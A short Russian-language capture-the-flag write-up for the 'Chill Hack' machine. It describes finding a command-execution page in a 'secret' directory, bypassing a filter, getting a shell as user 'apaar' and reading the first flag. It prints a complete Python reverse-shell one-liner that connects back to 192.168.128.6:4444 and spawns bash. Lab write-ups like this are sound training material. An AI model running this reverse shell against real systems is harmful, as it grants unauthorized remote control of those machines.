# Chill Hack — command injection и reverse shell

## Поиск точки входа

Во время разведки обнаружил директорию `secret`.

![Обнаруженная директория secret](../images/Pasted%20image%2020260327144921.png)

В ней можно было передавать команды серверу.

![Поле для выполнения команд](../images/Pasted%20image%2020260327151936.png)

## Получение shell

Подготовил reverse-shell команду:

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.128.6",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

Чтобы команда прошла фильтрацию, использовал экранированный вариант. Через уязвимый файл получил shell пользователя `apaar`.

![Получение оболочки пользователя apaar](../images/Pasted%20image%2020260327154326.png)

После этого прочитал первый флаг.

![Первый найденный флаг](../images/Pasted%20image%2020260327154706.png)
